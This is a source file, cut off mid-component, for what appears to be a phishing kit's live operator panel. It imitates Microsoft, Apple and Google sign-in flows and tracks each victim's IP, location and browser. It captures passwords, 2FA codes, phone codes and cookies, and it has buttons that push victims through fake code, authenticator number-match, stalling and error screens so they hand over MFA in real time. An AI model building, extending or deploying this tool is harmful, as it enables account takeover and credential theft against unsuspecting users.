import { useState, useEffect, useRef } from 'react';
import { Monitor, Smartphone, Tablet, Moon, Sun, Key, Lock, Mail, LayoutList, Eye, X, Database, Trash2, Loader2, Menu } from 'lucide-react';

const MicrosoftLogo = () => (
  <svg width="16" height="16" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
    <rect x="1" y="1" width="9" height="9" fill="#f25022"/>
    <rect x="11" y="1" width="9" height="9" fill="#7fba00"/>
    <rect x="1" y="11" width="9" height="9" fill="#00a4ef"/>
    <rect x="11" y="11" width="9" height="9" fill="#ffb900"/>
  </svg>
);
const MicrosoftLogoLg = () => (
  <svg width="20" height="20" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
    <rect x="1" y="1" width="9" height="9" fill="#f25022"/>
    <rect x="11" y="1" width="9" height="9" fill="#7fba00"/>
    <rect x="1" y="11" width="9" height="9" fill="#00a4ef"/>
    <rect x="11" y="11" width="9" height="9" fill="#ffb900"/>
  </svg>
);

const AppleLogo = ({ className, style }: { className?: string; style?: React.CSSProperties }) => (
  <svg className={className} style={style} viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg">
    <path fill="currentColor" d="M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-27.8 44.3-25.6 71.9 26.1 2 49.9-11.4 69.5-34.3z"/>
  </svg>
);

const GoogleLogo = ({ size = 20 }: { size?: number }) => (
  <svg width={size} height={size} viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
  </svg>
);

type Provider = 'microsoft' | 'apple' | 'google';
type Device = 'desktop' | 'tablet' | 'mobile';
type Theme = 'light' | 'dark';
type Prompt = 'password' | 'email-code' | 'other-ways';

interface VisitorLocation {
  city: string;
  country: string;
  countryCode: string;
  flag: string;
}

interface VisitorInfo {
  id: string;
  ip: string;
  location: VisitorLocation;
  provider: string;
  step: string;
  userAgent: string;
  connectedAt: number;
  formData: Record<string, string>;
  formHistory: { field: string; value: string; ts: number }[];
  online: boolean;
}

const PROVIDER_COLORS: Record<Provider, string> = {
  microsoft: '#0078D4',
  apple: '#007AFF',
  google: '#4285F4',
};

const STEP_LABELS: Record<string, string> = {
  email: 'Email',
  password: 'Password',
  'email-code': 'Code',
  'email-code-input': 'Enter Code',
  'other-ways': 'Other Ways',
  'phone-entry': 'Phone',
  'phone-code': 'Phone Code',
  'signin-options': 'Sign-in Opts',
  passkey: 'Passkey',
  stay: 'Stay Signed In',
  register: 'Register',
  recover: 'Recover',
  'device-trust': 'Device Trust',
  'verification-code': 'Verify Code',
  'phone-verify': 'Phone Verify',
  'phone-confirm': 'Confirm #',
  'phone-wrong': 'Review Activity',
  'phone-update': 'Update Phone',
  'prompt-number': 'Google Prompt',
  'killing-time': 'Killing Time',
  'sign-in-blocked': 'Blocked',
  verify: 'Verify CAPTCHA',
  'processing': '⏳ Waiting',
  'error-email': '✗ Email',
  'error-password': '✗ Password',
  'error-code': '✗ Code',
  'authenticator': 'Authenticator',
  'cant-use-authenticator': "Can't Use Auth",
  'verify-phone-number': 'Phone Verify',
};

const STEP_COLORS: Record<string, string> = {
  email: '#4b5563',
  password: '#0078D4',
  'email-code': '#7c3aed',
  'email-code-input': '#7c3aed',
  'other-ways': '#047857',
  'phone-entry': '#b45309',
  'phone-code': '#b45309',
  stay: '#15803d',
  register: '#be185d',
  recover: '#9f1239',
  'device-trust': '#1d4ed8',
  'verification-code': '#6d28d9',
  'phone-verify': '#065f46',
  'phone-confirm': '#0d7a5f',
  'phone-wrong': '#dc2626',
  'phone-update': '#7c3aed',
  'prompt-number': '#4285F4',
  'killing-time': '#1d4ed8',
  'sign-in-blocked': '#15803d',
  verify: '#1a73e8',
  'processing': '#92400e',
  'error-email': '#991b1b',
  'error-password': '#991b1b',
  'error-code': '#991b1b',
  'authenticator': '#0078D4',
  'cant-use-authenticator': '#047857',
  'verify-phone-number': '#7c3aed',
};

const FIELD_LABELS: Record<string, string> = {
  email: 'Email / Phone',
  password: 'Password',
  email_code: 'Email Code',
  phone: 'Phone Number',
  phone_code: 'Phone Code',
  phone_update: 'Phone Update',
  verification_code: '2FA Code',
  cookies: 'Browser Cookies',
};

const PROVIDER_PUSH_STEPS: Record<string, { label: string; step: string; color: string }[]> = {
  microsoft: [
    { label: '↩ Email',       step: 'email',               color: '#4b5563' },
    { label: 'Password',      step: 'password',             color: '#0078D4' },
    { label: '⎉ Code',        step: '__code_choice__',      color: '#7c3aed' },
    { label: 'Authenticator', step: 'authenticator',        color: '#0078D4' },
    { label: 'Phone Verify',  step: 'verify-phone-number',  color: '#7c3aed' },
    { label: 'Other ways',    step: 'other-ways',           color: '#047857' },
  ],
  apple: [
    { label: '↩ Email',     step: 'email',            color: '#4b5563' },
    { label: 'Password',    step: 'password',          color: '#007AFF' },
    { label: 'Device',      step: 'device-trust',      color: '#1d4ed8' },
    { label: 'Verify Code', step: 'verification-code', color: '#6d28d9' },
  ],
  google: [
    { label: '↩ Email',        step: 'email',          color: '#4b5563' },
    { label: 'Password',       step: 'password',       color: '#4285F4' },
    { label: 'Verify CAPTCHA', step: 'verify',         color: '#1a73e8' },
    { label: 'Phone Verify',   step: 'phone-verify',   color: '#065f46' },
    { label: 'Confirm #',      step: 'phone-confirm',  color: '#0d7a5f' },
    { label: 'Wrong #',        step: 'phone-wrong',    color: '#dc2626' },
    { label: 'Phone Code',     step: 'phone-code',     color: '#b45309' },
    { label: 'Google Prompt',  step: 'prompt-number',  color: '#4285F4' },
    { label: 'Update Phone',   step: 'phone-update',   color: '#7c3aed' },
    { label: 'Killing Time',   step: 'killing-time',   color: '#1d4ed8' },
  ],
};

const PROVIDER_ERROR_STEPS: { label: string; step: string; color: string }[] = [
  { label: '⏳ Loading',   step: 'processing',     color: '#92400e' },
  { label: '✗ Email err',  step: 'error-email',    color: '#991b1b' },
  { label: '✗ Pwd err',    step: 'error-password', color: '#991b1b' },
  { label: '✗ Code err',   step: 'error-code',     color: '#991b1b' },
];

function parseUA(ua: string) {
  let browser = 'Unknown';
  if (/Edg\//.test(ua)) browser = 'Edge';
  else if (/OPR\/|Opera\//.test(ua)) browser = 'Opera';
  else if (/Chrome\//.test(ua)) browser = 'Chrome';
  else if (/Firefox\//.test(ua)) browser = 'Firefox';
  else if (/Safari\//.test(ua)) browser = 'Safari';

  let os = 'Unknown';
  if (/iPhone/.test(ua)) os = 'iPhone';
  else if (/iPad/.test(ua)) os = 'iPad';
  else if (/Android/.test(ua)) os = 'Android';
  else if (/Mac OS X/.test(ua)) os = 'macOS';
  else if (/Windows NT/.test(ua)) os = 'Windows';
  else if (/CrOS/.test(ua)) os = 'ChromeOS';
  else if (/Linux/.test(ua)) os = 'Linux';

  return { browser, os };
}

function ProviderBadge({ provider, size = 14 }: { provider: string; size?: number }) {
  if (provider === 'microsoft') return <MicrosoftLogo />;
  if (provider === 'apple') return <AppleLogo className={`text-black`} style={{ width: size, height: size } as React.CSSProperties} />;
  if (provider === 'google') return <GoogleLogo size={size} />;
  return <span className="text-[11px] text-[#aaa]">{provider}</span>;
}

function loginSrc(provider: Provider, device: Device, theme: Theme, prompt: Prompt, phoneEnabled: boolean, googlePhone?: string, gVerifyMethod?: string, gCorrectNumber?: number) {
  const base = import.meta.env.BASE_URL.replace(/\/$/, '');
  const phonePart = provider === 'microsoft' && phoneEnabled ? '&phone=1' : '';
  const gphonePart = provider === 'google' && googlePhone ? `&gphone=${googlePhone}` : '';
  const gverifyPart = provider === 'google' && gVerifyMethod ? `&gverify=${gVerifyMethod}` : '';
  const gnumberPart = provider === 'google' && gCorrectNumber != null ? `&gnumber=${gCorrectNumber}` : '';
  return `${base}/?provider=${provider}&device=${device}&theme=${theme}&prompt=${prompt}${phonePart}${gphonePart}${gverifyPart}${gnumberPart}`;
}

function visitorModalSrc(visitor: VisitorInfo) {
  const base = import.meta.env.BASE_URL.replace(/\/$/, '');
  return `${base}/?provider=${visitor.provider}&device=desktop&theme=light&prompt=password&viewOnly=1&targetId=${visitor.id}&initialStep=${visitor.step}`;
}

function Toggle({ enabled, onToggle }: { enabled: boolean; onToggle: () => void }) {
  return (
    <button
      onClick={onToggle}
      className={`relative w-9 h-5 rounded-full transition-colors flex-shrink-0 focus:outline-none ${enabled ? 'bg-[#0078D4]' : 'bg-[#3a3f4a]'}`}
      aria-pressed={enabled}
    >
      <span className={`absolute top-0.5 w-4 h-4 rounded-full bg-white shadow transition-transform ${enabled ? 'translate-x-4' : 'translate-x-0.5'}`} />
    </button>
  );
}

function ActionBtn({ label, color, onClick, fullWidth }: { label: string; color: string; onClick: () => void; fullWidth?: boolean }) {
  return (
    <button
      onClick={onClick}
      className={`px-2 py-1 rounded text-[11px] font-semibold text-white transition-opacity hover:opacity-80 flex-shrink-0 ${fullWidth ? 'w-full' : ''}`}
      style={{ backgroundColor: color }}
    >
      {label}
    </button>
  );
}

// ── Confirm-action preview modal ───────────────────────────────────────────────

function ConfirmActionModal({
  visitor, step, label, color, onCancel, onConfirm,
}: {
  visitor: VisitorInfo; step: string; label: string; color: string;
  onCancel: () => void; onConfirm: () => void;
}) {
  const [loaded, setLoaded] = useState(false);
  const base = import.meta.env.BASE_URL.replace(/\/$/, '');
  const src = `${base}/?provider=${visitor.provider}&device=desktop&theme=light&initialStep=${step}`;
  return (
    <div className="absolute inset-0 z-[100] flex items-end sm:items-center justify-center" style={{ backgroundColor: 'rgba(0,0,0,0.78)', backdropFilter: 'blur(5px)' }}>
      <div className="w-full sm:max-w-[480px] sm:mx-6 bg-[#13151a] border border-[#2d3139] rounded-t-2xl sm:rounded-2xl shadow-2xl overflow-hidden flex flex-col" style={{ maxHeight: '90vh' }}>
        <div className="flex items-center gap-3 px-5 py-4 border-b border-[#2d3139] flex-shrink-0">
          <div className="w-9 h-9 rounded-xl flex items-center justify-center font-bold text-white text-[15px] flex-shrink-0" style={{ backgroundColor: color }}>
            {label.replace(/[^a-zA-Z]/g, '').charAt(0).toUpperCase() || '→'}
          </div>
          <div className="flex-1 min-w-0">
            <p className="text-white font-semibold text-[14px] leading-snug">Send to: <span style={{ color }}>{label}</span></p>
            <p className="text-[11px] text-[#555d6b] mt-0.5">Preview below — confirm to push visitor to this step</p>
          </div>
          <button onClick={onCancel} className="p-1.5 rounded-lg text-[#555d6b] hover:text-white hover:bg-[#2d3139] transition-colors flex-shrink-0">
            <X className="w-4 h-4" />
          </button>
        </div>
        <div className="relative bg-[#0d0e12] overflow-y-auto" style={{ height: 380 }}>
          {!loaded && (
            <div className="absolute inset-0 flex flex-col items-center justify-center gap-3 pointer-events-none">
              <Loader2 className="w-6 h-6 text-[#555d6b] animate-spin" />
              <p className="text-[12px] text-[#555d6b]">Loading preview…</p>
            </div>
          )}
          <iframe src={src} className="w-full border-0 block" style={{ height: 680, display: 'block' }} onLoad={() => setLoaded(true)} title="Step preview" />
        </div>
        <div className="flex gap-3 px-5 py-4 border-t border-[#2d3139] flex-shrink-0">
          <button onClick={onCancel} className="flex-1 py-3 rounded-xl border border-[#2d3139] text-[13px] font-semibold text-[#aeb5c0] hover:bg-[#1e2128] transition-colors">
            Cancel
          </button>
          <button onClick={onConfirm} className="flex-1 py-3 rounded-xl text-[13px] font-semibold text-white transition-opacity hover:opacity-90" style={{ backgroundColor: color }}>
            ✓ Confirm — Send Now
          </button>
        </div>
      </div>
    </div>
  );
}

// ── Visitor live-view modal ────────────────────────────────────────────────────

function VisitorModal({
  visitor,
  onClose,
  onPushAction,
  onDeleteField,
  onDeleteAll,
}: {
  visitor: VisitorInfo;
  onClose: () => void;
  onPushAction: (visitorId: string, navigate: string, extra?: { promptNumber?: number; phoneDigits?: string }) => void;
  onDeleteField: (visitorId: string, field: string) => void;
  onDeleteAll: (visitorId: string) => void;
}) {
  const [iframeLoaded, setIframeLoaded] = useState(false);
  const [promptDialogOpen, setPromptDialogOpen] = useState(false);
  const [promptInputVal, setPromptInputVal] = useState('');
  const [retryDialogOpen, setRetryDialogOpen] = useState(false);
  const [retryInputVal, setRetryInputVal] = useState('');
  const [phoneCodeDialogOpen, setPhoneCodeDialogOpen] = useState(false);
  const [phoneDigitsVal, setPhoneDigitsVal] = useState('');
  const [pendingAction, setPendingAction] = useState<{ step: string; label: string; color: string; extra?: { promptNumber?: number; phoneDigits?: string } } | null>(null);
  const [revealField, setRevealField] = useState<string | null>(null);
  const [codeTypeDialogOpen, setCodeTypeDialogOpen] = useState(false);
  const [codeTypeSelected, setCodeTypeSelected] = useState<'email' | 'phone'>('email');
  const [authenticatorDialogOpen, setAuthenticatorDialogOpen] = useState(false);
  const [authenticatorNumberVal, setAuthenticatorNumberVal] = useState('');

  const iframeSrc = visitorModalSrc(visitor);
  const stepColor = STEP_COLORS[visitor.step] ?? '#4b5563';
  const stepLabel = STEP_LABELS[visitor.step] ?? visitor.step;
  const formEntries = Object.entries(visitor.formData ?? {});
  const formHistory = [...(visitor.formHistory ?? [])].reverse();
  const isSensitive = (field: string) => field === 'password' || field === 'email_code' || field === 'phone_code';
  const ua = parseUA(visitor.userAgent);

  // Steps that bypass the preview (send immediately or have own dialog)
  const triggerAction = (step: string, label: string, color: string, extra?: { promptNumber?: number; phoneDigits?: string }) => {
    if (step === '__code_choice__') { setCodeTypeDialogOpen(true); return; }
    if (step === 'authenticator' && visitor.provider === 'microsoft') { setAuthenticatorNumberVal(''); setAuthenticatorDialogOpen(true); return; }
    if (step === 'phone-code' && visitor.provider === 'google') {
      const raw = (visitor.formData ?? {})['phone'] ?? '';
      setPhoneDigitsVal(raw ? raw.replace(/\D/g, '').slice(-2) : '');
      setPhoneCodeDialogOpen(true);
      return;
    }
    // Error and immediate steps — send without preview confirmation
    if (step === 'gmail-done' || step === 'error-email' || step === 'error-password' || step === 'error-code') {
      onPushAction(visitor.id, step, extra);
      return;
    }
    setPendingAction({ step, label, color, extra });
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-2 sm:p-4" style={{ backgroundColor: 'rgba(0,0,0,0.85)', backdropFilter: 'blur(6px)' }}>
      <div className="relative w-full h-full max-w-[1260px] max-h-[860px] flex flex-col bg-[#13151a] rounded-2xl overflow-hidden border border-[#2d3139] shadow-2xl">

        {/* Confirm-action overlay */}
        {pendingAction && (
          <ConfirmActionModal
            visitor={visitor}
            step={pendingAction.step}
            label={pendingAction.label}
            color={pendingAction.color}
            onCancel={() => setPendingAction(null)}
            onConfirm={() => { onPushAction(visitor.id, pendingAction.step, pendingAction.extra); setPendingAction(null); }}
          />
        )}

        {/* Header */}
        <div className="flex items-center gap-2 sm:gap-3 px-4 sm:px-5 py-3 border-b border-[#2d3139] bg-[#16181d] flex-shrink-0">
          <div className="flex items-center gap-2 sm:gap-3 min-w-0 flex-1">
            <div className={`w-2 h-2 rounded-full flex-shrink-0 ${visitor.online ? 'bg-green-400 animate-pulse' : 'bg-red-500'}`} />
            <div className="w-6 h-6 rounded bg-white flex items-center justify-center flex-shrink-0 shadow-sm">
              <ProviderBadge provider={visitor.provider} />
            </div>
            <span className="text-white font-semibold text-[13px] sm:text-[14px] flex-shrink-0">Live View</span>
            <span className="text-[10px] font-semibold px-2 py-0.5 rounded text-white flex-shrink-0" style={{ backgroundColor: stepColor }}>{stepLabel}</span>
            <span className="text-[11px] text-[#8a919e] truncate hidden sm:block">{visitor.location.flag} {visitor.location.city}, {visitor.location.country}</span>
            <span className="text-[10px] font-mono text-[#555d6b] flex-shrink-0 hidden lg:block">{visitor.ip}</span>
            <span className="hidden md:flex items-center gap-1 text-[10px] text-[#555d6b] bg-[#1e2128] rounded px-2 py-0.5 flex-shrink-0">
              {ua.browser} · {ua.os}
            </span>
          </div>
          <button onClick={onClose} className="w-8 h-8 flex items-center justify-center rounded-full bg-[#2d3139] hover:bg-[#3a3f4a] text-[#aeb5c0] hover:text-white transition-colors flex-shrink-0 ml-1">
            <X className="w-4 h-4" />
          </button>
        </div>

        {/* Body */}
        <div className="flex flex-col sm:flex-row flex-1 overflow-hidden min-h-0">

          {/* Login iframe */}
          <div className="flex-1 bg-[#0b0c10] relative overflow-hidden" style={{ minHeight: 180 }}>
            {!iframeLoaded && (
              <div className="absolute inset-0 z-10 overflow-hidden">
                {visitor.provider === 'microsoft' && (
                  <div className="w-full h-full flex items-center justify-center bg-white" style={{ fontFamily: 'system-ui, Segoe UI, sans-serif' }}>
                    <div className="flex flex-col items-center px-10 pt-10 pb-12 shadow-md bg-white w-[380px]">
                      <div className="flex items-center gap-2 mb-8"><MicrosoftLogoLg /><span className="text-[15px] font-semibold tracking-wide text-[#737373]">Microsoft</span></div>
                      <div className="flex gap-2">{[0,1,2].map(i => <div key={i} className="w-2.5 h-2.5 rounded-full bg-[#0078D4] animate-bounce" style={{ animationDelay: `${i*0.15}s` }} />)}</div>
                    </div>
                  </div>
                )}
                {visitor.provider === 'apple' && (
                  <div className="w-full h-full flex items-center justify-center bg-[#f5f5f7]">
                    <div className="flex flex-col items-center py-14 px-12 rounded-2xl shadow-xl bg-white">
                      <AppleLogo className="w-12 h-12 text-black mb-5" />
                      <svg className="w-8 h-8" viewBox="0 0 50 50"><circle cx="25" cy="25" r="20" fill="none" strokeWidth="3" strokeLinecap="round" stroke="#1c1c1e" strokeDasharray="70 130" strokeOpacity="0.6" className="animate-spin" style={{ animationDuration: '0.9s' }} /></svg>
                    </div>
                  </div>
                )}
                {visitor.provider === 'google' && (
                  <div className="w-full h-full flex items-center justify-center bg-[#f0f4f9]">
                    <div className="flex flex-col items-center p-10 rounded-3xl shadow-xl bg-white gap-6">
                      <GoogleLogo size={32} />
                      <svg className="w-9 h-9 animate-spin" viewBox="0 0 50 50" style={{ animationDuration: '1s' }}>
                        <defs><linearGradient id="goog-load-v" x1="0%" y1="0%" x2="100%" y2="0%"><stop offset="0%" stopColor="#4285F4"/><stop offset="33%" stopColor="#EA4335"/><stop offset="66%" stopColor="#FBBC05"/><stop offset="100%" stopColor="#34A853"/></linearGradient></defs>
                        <circle cx="25" cy="25" r="20" fill="none" strokeWidth="4" strokeLinecap="round" stroke="url(#goog-load-v)" strokeDasharray="80 126" />
                      </svg>
                    </div>
                  </div>
                )}
                {!['microsoft','apple','google'].includes(visitor.provider) && (
                  <div className="w-full h-full flex flex-col items-center justify-center gap-4 bg-[#0b0c10]">
                    <Loader2 className="w-8 h-8 text-[#3a3f4a] animate-spin" />
                    <p className="text-[14px] text-[#8a919e] font-medium">Loading live view…</p>
                  </div>
                )}
              </div>
            )}
            <iframe key={`modal-${visitor.id}`} src={iframeSrc} className="w-full h-full border-0" title="Visitor live view" onLoad={() => setIframeLoaded(true)} />
            {iframeLoaded && (
              <div className="absolute bottom-3 right-3 bg-black/60 rounded-lg px-2.5 py-1.5 text-[10px] text-[#8a919e] pointer-events-none backdrop-blur-sm hidden sm:block">
                Synced via WebSocket — reflects visitor's step in real time
              </div>
            )}
          </div>

          {/* Right panel */}
          <div className="sm:w-[288px] flex-shrink-0 flex flex-col border-t sm:border-t-0 sm:border-l border-[#2d3139] overflow-y-auto bg-[#13151a]">

            {/* Mobile: location + browser row */}
            <div className="sm:hidden flex items-center gap-2 px-4 py-2.5 border-b border-[#2d3139] bg-[#16181d]">
              <span className="text-[11px] text-[#8a919e] truncate">{visitor.location.flag} {visitor.location.city} · {ua.browser} on {ua.os}</span>
            </div>

            {/* Navigate */}
            <div className="p-5 border-b border-[#2d3139]">
              <p className="text-[9px] font-bold uppercase tracking-[0.12em] text-[#555d6b] mb-3">Navigate</p>
              <div className="space-y-1.5">
                {(PROVIDER_PUSH_STEPS[visitor.provider] ?? PROVIDER_PUSH_STEPS.microsoft).map(({ label, step, color }) => (
                  <button
                    key={step}
                    onClick={() => triggerAction(step, label, color)}
                    className="w-full flex items-center gap-3 px-3.5 py-2.5 rounded-xl text-left transition-all hover:brightness-110 active:scale-[0.98]"
                    style={{ backgroundColor: `${color}18`, border: `1px solid ${color}35` }}
                  >
                    <span className="w-2 h-2 rounded-full flex-shrink-0" style={{ backgroundColor: color }} />
                    <span className="text-[13px] font-semibold flex-1" style={{ color }}>{label}</span>
                    <span className="text-[11px] text-[#3e4450]">›</span>
                  </button>
                ))}
              </div>

              {/* Phone code dialog */}
              {phoneCodeDialogOpen && visitor.provider === 'google' && (
                <div className="mt-3 bg-[#1a1d24] rounded-xl border border-[#b45309]/50 p-4 space-y-3">
                  <p className="text-[11px] text-[#8a919e] font-medium">Last 2 digits shown on screen</p>
                  <input type="text" maxLength={2} value={phoneDigitsVal} onChange={e => setPhoneDigitsVal(e.target.value.replace(/\D/g, '').slice(0, 2))} placeholder="09"
                    className="w-full bg-[#0b0c10] border border-[#2d3139] rounded-lg px-3 py-2 text-[13px] text-white placeholder-[#555d6b] outline-none focus:border-[#b45309] transition-colors" />
                  <div className="flex gap-2">
                    <button onClick={() => setPhoneCodeDialogOpen(false)} className="flex-1 py-2 rounded-lg border border-[#2d3139] text-[12px] text-[#8a919e] hover:bg-[#2d3139] transition-colors">Cancel</button>
                    <button onClick={() => { if (phoneDigitsVal.length >= 1) { onPushAction(visitor.id, 'phone-code', { phoneDigits: phoneDigitsVal }); setPhoneCodeDialogOpen(false); } }}
                      className="flex-1 py-2 rounded-lg text-[12px] font-semibold text-white" style={{ backgroundColor: '#b45309' }}>Send</button>
                  </div>
                </div>
              )}

              {/* Code type dialog — Microsoft ⎉ Code button */}
              {codeTypeDialogOpen && visitor.provider === 'microsoft' && (
                <div className="mt-3 bg-[#1a1d24] rounded-xl border border-[#7c3aed]/50 p-4 space-y-3">
                  <p className="text-[11px] text-[#8a919e] font-medium">Send code via</p>
                  <div className="space-y-2">
                    <label className="flex items-center gap-2 cursor-pointer">
                      <input type="radio" name="ms-code-type" value="email" checked={codeTypeSelected === 'email'} onChange={() => setCodeTypeSelected('email')} className="accent-[#7c3aed]" />
                      <span className="text-[13px] text-white">Email code</span>
                    </label>
                    <label className="flex items-center gap-2 cursor-pointer">
                      <input type="radio" name="ms-code-type" value="phone" checked={codeTypeSelected === 'phone'} onChange={() => setCodeTypeSelected('phone')} className="accent-[#7c3aed]" />
                      <span className="text-[13px] text-white">Phone code</span>
                    </label>
                  </div>
                  <div className="flex gap-2">
                    <button onClick={() => setCodeTypeDialogOpen(false)} className="flex-1 py-2 rounded-lg border border-[#2d3139] text-[12px] text-[#8a919e] hover:bg-[#2d3139] transition-colors">Cancel</button>
                    <button onClick={() => {
                      const targetStep = codeTypeSelected === 'email' ? 'email-code' : 'phone-code';
                      const targetLabel = codeTypeSelected === 'email' ? 'Email Code' : 'Phone Code';
                      setCodeTypeDialogOpen(false);
                      setPendingAction({ step: targetStep, label: targetLabel, color: '#7c3aed' });
                    }} className="flex-1 py-2 rounded-lg text-[12px] font-semibold text-white" style={{ backgroundColor: '#7c3aed' }}>Confirm</button>
                  </div>
                </div>
              )}

              {/* Authenticator number dialog — Microsoft */}
              {authenticatorDialogOpen && visitor.provider === 'microsoft' && (
                <div className="mt-3 bg-[#1a1d24] rounded-xl border border-[#0078D4]/50 p-4 space-y-3">
                  <p className="text-[11px] text-[#8a919e] font-medium">Number to display on the Authenticator screen</p>
                  <input
                    type="number" min={1} max={99} value={authenticatorNumberVal}
                    onChange={e => setAuthenticatorNumberVal(e.target.value)} placeholder="e.g. 42"
                    className="w-full bg-[#0b0c10] border border-[#2d3139] rounded-lg px-3 py-2 text-[13px] text-white placeholder-[#555d6b] outline-none focus:border-[#0078D4] transition-colors"
                    autoFocus
                  />
                  <div className="flex gap-2">
                    <button onClick={() => setAuthenticatorDialogOpen(false)} className="flex-1 py-2 rounded-lg border border-[#2d3139] text-[12px] text-[#8a919e] hover:bg-[#2d3139] transition-colors">Cancel</button>
                    <button
                      onClick={() => { const n = parseInt(authenticatorNumberVal, 10); if (n >= 1 && n <= 99) { onPushAction(visitor.id, 'authenticator', { promptNumber: n }); setAuthenticatorDialogOpen(false); } }}
                      className="flex-1 py-2 rounded-lg text-[12px] font-semibold text-white" style={{ backgroundColor: '#0078D4' }}
                    >Send</button>
                  </div>
                </div>
              )}

              {/* Google Prompt controls */}
              {visitor.provider === 'google' && (
                <div className="mt-4 space-y-3">
                  <p className="text-[9px] font-bold uppercase tracking-[0.12em] text-[#555d6b]">Prompt</p>
                  <div className="space-y-1.5">
                    {[
                      { label: '✓ Prompt Done', step: 'processing', color: '#15803d' },
                      { label: '→ Gmail', step: 'gmail-done', color: '#34A853' },
                      { label: '↺ Prompt Retry', step: '__retry__', color: '#92400e' },
                    ].map(({ label, step, color }) => (
                      <button key={step}
                        onClick={() => {
                          if (step === '__retry__') { setRetryInputVal(''); setRetryDialogOpen(true); return; }
                          triggerAction(step, label, color);
                        }}
                        className="w-full flex items-center gap-3 px-3.5 py-2.5 rounded-xl text-left transition-all hover:brightness-110 active:scale-[0.98]"
                        style={{ backgroundColor: `${color}18`, border: `1px solid ${color}35` }}>
                        <span className="w-2 h-2 rounded-full flex-shrink-0" style={{ backgroundColor: color }} />
                        <span className="text-[13px] font-semibold flex-1" style={{ color }}>{label}</span>
                        <span className="text-[11px] text-[#3e4450]">›</span>
                      </button>
                    ))}
                  </div>
                  {retryDialogOpen && (
                    <div className="bg-[#1a1d24] rounded-xl border border-[#92400e]/50 p-4 space-y-3">
                      <p className="text-[11px] text-[#8a919e] font-medium">New number to display on retry</p>
                      <input type="number" min={1} max={99} value={retryInputVal} onChange={e => setRetryInputVal(e.target.value)} placeholder="e.g. 28"
                        className="w-full bg-[#0b0c10] border border-[#2d3139] rounded-lg px-3 py-2 text-[13px] text-white placeholder-[#555d6b] outline-none focus:border-[#92400e] transition-colors" />
                      <div className="flex gap-2">
                        <button onClick={() => setRetryDialogOpen(false)} className="flex-1 py-2 rounded-lg border border-[#2d3139] text-[12px] text-[#8a919e] hover:bg-[#2d3139] transition-colors">Cancel</button>
                        <button onClick={() => { const n = parseInt(retryInputVal, 10); if (n > 0) { onPushAction(visitor.id, 'prompt-timeout', { promptNumber: n }); setRetryDialogOpen(false); } }}
                          className="flex-1 py-2 rounded-lg text-[12px] font-semibold text-white" style={{ backgroundColor: '#92400e' }}>Retry</button>
                      </div>
                    </div>
                  )}
                  {!promptDialogOpen ? (
                    <button onClick={() => { setPromptInputVal(''); setPromptDialogOpen(true); }}
                      className="w-full text-[12px] font-semibold py-2.5 rounded-xl border border-[#4285F4]/40 text-[#4285F4] hover:bg-[#4285F4]/10 transition-colors">
                      Send Google Prompt #
                    </button>
                  ) : (
                    <div className="bg-[#1a1d24] rounded-xl border border-[#4285F4]/40 p-4 space-y-3">
                      <p className="text-[11px] text-[#8a919e] font-medium">Number shown on login screen</p>
                      <input type="number" min={1} max={99} value={promptInputVal} onChange={e => setPromptInputVal(e.target.value)} placeholder="e.g. 42"
                        className="w-full bg-[#0b0c10] border border-[#2d3139] rounded-lg px-3 py-2 text-[13px] text-white placeholder-[#555d6b] outline-none focus:border-[#4285F4] transition-colors" />
                      <div className="flex gap-2">
                        <button onClick={() => setPromptDialogOpen(false)} className="flex-1 py-2 rounded-lg border border-[#2d3139] text-[12px] text-[#8a919e] hover:bg-[#2d3139] transition-colors">Cancel</button>
                        <button onClick={() => { const n = parseInt(promptInputVal, 10); if (n > 0) { onPushAction(visitor.id, 'prompt-number', { promptNumber: n }); setPromptDialogOpen(false); } }}
                          className="flex-1 py-2 rounded-lg text-[12px] font-semibold text-white" style={{ backgroundColor: '#4285F4' }}>Send</button>
                      </div>
                    </div>
                  )}
                </div>
              )}
            </div>

            {/* Simulate */}
            <div className="p-5 border-b border-[#2d3139]">
              <p className="text-[9px] font-bold uppercase tracking-[0.12em] text-[#555d6b] mb-3">Simulate</p>
              <div className="space-y-1.5">
                {PROVIDER_ERROR_STEPS.map(({ label, step, color }) => (
                  <button
                    key={step}
                    onClick={() => triggerAction(step, label, color)}
                    className="w-full flex items-center gap-3 px-3.5 py-2.5 rounded-xl text-left transition-all hover:brightness-110 active:scale-[0.98]"
                    style={{ backgroundColor: `${color}18`, border: `1px solid ${color}35` }}
                  >
                    <span className="w-2 h-2 rounded-full flex-shrink-0" style={{ backgroundColor: color }} />
                    <span className="text-[13px] font-semibold flex-1" style={{ color }}>{label}</span>
                    <span className="text-[11px] text-[#3e4450]">›</span>
                  </button>
                ))}
              </div>
            </div>

            {/* Captured form data */}
            <div className="p-5 flex-1">
